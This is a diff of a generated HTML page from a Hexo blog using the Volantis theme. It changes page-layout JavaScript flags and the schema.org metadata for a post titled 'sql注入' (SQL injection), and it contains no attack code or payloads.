     <!-- pjax占位 -->
@@ -2832,13 +2943,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2847,14 +2959,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -3352,7 +3464,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2025/","name":"2025"}},{"@type":"ListItem","position":4,"item":{"@id":"http://example.com/archives/2025/1/","name":"1"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/01/12/sql注入/","name":"sql注入"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sql注入","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/","wordCount":0,"datePublished":"2025-01-12T05:28:35.000Z","dateModified":"2025-01-15T02:54:24.346Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
